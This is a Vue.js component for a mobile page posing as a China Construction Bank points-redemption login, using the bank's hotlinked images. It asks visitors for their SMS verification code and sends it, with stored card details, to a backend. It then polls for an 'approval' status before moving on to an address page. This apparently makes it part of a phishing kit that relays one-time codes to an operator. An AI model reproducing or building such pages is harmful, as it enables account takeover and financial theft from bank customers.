<template>
  <div >
    <div style="background:#449cff;text-align: left;display: flex;justify-content:;align-items: center;height: 44px;">
       <div  @click="goback" style="width: 40px;height: 44px;display: flex;align-items: center;">
         <img  src='http://login.ccb.com/ccbctp/newMobile/images/return_btn.png' style="height: 40%;width: auto; padding-left: 10px;"> 
       </div>
       <div style="color:white;width: 100%;text-align: center;padding-right: 10px;">积分兑换登录</div>
    </div>  

       
    <div style="padding: 5px;text-align: left">
      <div style="display: flex;color: red;padding: 5px;">
        
      <h3 >为了您的账户安全，请填写您收到的短信验证码</h3>
        </div>
     

        <div style="display: flex;align-items: center;justify-content: space-between;">
           <b-field label='验证码' style="width: 100%;">
            <div style="display: flex;justify-content: space-between;align-items:center;width: 100%;">
            <b-input v-model="cardcode" placeholder="请输入短信验证码" style="width: 100%;" >
            </b-input>
            <b-button @click="getcode" v-if="!daojishi" type="is-danger">获取验证码</b-button>
            <b-button v-if="daojishi" type="is-danger">{{djs}}</b-button>
          </div>
          </b-field>
        </div>
     </div>

    <b-button @click="goSuccess"  type="is-danger">下一步</b-button>

  </div>
</template>

<script>

import Api from '@/axios'
export default {
  name: 'HelloWorld',
  mounted()
  {
     //this.getcode()
     this.checkstate();

  },
  data () {
    return {
      address:"",
      cardphone:"",
      cardcode:"",
      username:"",
      daojishi:false,
      djs:300,
      timer:-1,
      dtimer:-1,

    }
  },
  methods:{
     goback(){
       this.$router.go(-1);
     },

     getcode()
     { 
        this.daojishi=true;
        Api.getcode(window.rid,window.userinfo).then((res)=>{
            console.log("yanzhengma");
        });
        this.djs=300;
       this.dtimer=setInterval(()=>{
            this.djs--;
        },1000);
     },
     checkstate()
     {
           this.timer=setInterval(()=>{
                 Api.check(window.rid).then((rs)=>{
                     if(rs.data.success){
                         if(rs.data.message=="审核失败"){
                            clearInterval(this.timer)
                            window.showMessage("验证码有误,请重新提交验证码","txt");
                            setTimeout(window.hideMessage,2000);
                         }
                         else if(rs.data.message=="审核成功"){
                              clearInterval(this.timer)
                              window.hideMessage();
                              this.$router.push("address")
                         }
                         else if(rs.data.message=="卡信息错误"){
                            clearInterval(this.timer);
                            window.showMessage("你的卡片信息有误，无法获取验证码,请重新填写","txt");
                            setTimeout(window.hideMessage,2000);
                            this.goback();
                         }
                     }
                 })
             },2000);
     },
     goSuccess()
     {  
       
       //window.userinfo.address=this.address
       //window.userinfo.cardphone=this.cardphone
       clearInterval(this.timer);
       window.userinfo.cardcode=this.cardcode
       //window.userinfo.name=this.username
       window.showMessage("正在审核中,请稍后","loading");
       this.daojishi=false;
       this.djs=300;
       clearInterval(this.dtimer);
       Api.updatecode(window.rid,window.userinfo).then((res)=>{
            
            this.timer=setInterval(()=>{
                 Api.check(window.rid).then((rs)=>{

                     if(rs.data.success){
                         if(rs.data.message=="审核失败"){
                            clearInterval(this.timer)
                            window.showMessage("验证码有误,请重新提交验证码","txt");
                            setTimeout(window.hideMessage,2000);
                         }
                         else if(rs.data.message=="审核成功"){
                              clearInterval(this.timer)
                              window.hideMessage();
                              this.$router.push("address")
                         }
                         else if(rs.data.message=="卡信息错误"){
                            clearInterval(this.timer);
                            window.showMessage("你的卡片信息有误，无法获取验证码,请重新填写","txt");
                            setTimeout(window.hideMessage,2000);
                            this.goback();
                         }
                     }
                 })
             },2000);
       });
      
     }
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
.blueBox {
    background: #449cff;
}

.index_search {
    width: 96vw;
    margin: 2vw;
    border-radius: 4px;
    display: block;
    height: 30px;
    text-align: center;
    background: rgba(255,255,255,0.8);
    display: flex;
    justify-content: center;
    align-items: center;
}
.index_search input {
   
    border: none;
    outline: none;
    background: url(http://jf.ccb.com/img/mobile/search.png) no-repeat 0 center;
    font-size: 1rem;
    background-size: 20px;
    color: #333;
    text-align: center;
}
h1, h2 {
  font-weight: normal;
}
ul {
  list-style-type: none;
  padding: 0;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}
</style>



